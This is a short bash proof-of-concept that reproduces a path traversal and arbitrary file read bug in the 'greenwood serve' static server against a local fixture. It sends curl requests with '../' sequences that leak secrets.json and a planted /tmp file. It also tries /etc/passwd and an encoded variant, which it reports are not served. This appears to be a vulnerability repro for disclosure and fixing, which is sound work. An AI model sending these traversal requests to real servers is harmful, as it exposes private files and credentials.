#!/usr/bin/env bash
# Repro: path traversal / arbitrary file read on the production `greenwood serve` static server.
# Prereq: `yarn install` at repo root. Node >= 22.18.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$HERE/../.." && pwd)"
CLI="$REPO_ROOT/packages/cli/src/bin.js"
cd "$HERE/fixture"

node "$CLI" build > /tmp/gwd-repro-build.log 2>&1
node "$CLI" serve  > /tmp/gwd-repro-serve.log 2>&1 &
SPID=$!
trap 'kill $SPID 2>/dev/null' EXIT
for i in $(seq 1 40); do curl -s -o /dev/null http://localhost:8080/ && break; sleep 0.5; done

echo "### 1) baseline: /secrets.json is outside the web root -> 404 (correct)"
curl -s --path-as-is -w "  status=%{http_code}\n" http://localhost:8080/secrets.json

echo "### 2) TRAVERSAL: GET /../secrets.json -> 200 leaks the file"
curl -s --path-as-is -w "\n  status=%{http_code}\n" 'http://localhost:8080/../secrets.json'

echo "### 3) absolute read: many ../ collapse to FS root, then read a planted /tmp/pwned.css"
echo 'ARBITRARY-FILE-READ-PROOF' > /tmp/pwned.css
curl -s --path-as-is -w "\n  status=%{http_code}\n" 'http://localhost:8080/../../../../../../../../tmp/pwned.css'
rm -f /tmp/pwned.css

echo "### note: /etc/passwd (no supported extension) and encoded ..%2f are NOT served"
curl -s --path-as-is -w "  /etc/passwd status=%{http_code}\n" 'http://localhost:8080/../../../../../../etc/passwd'
curl -s --path-as-is -w "  ..%%2f status=%{http_code}\n" 'http://localhost:8080/..%2fsecrets.json'
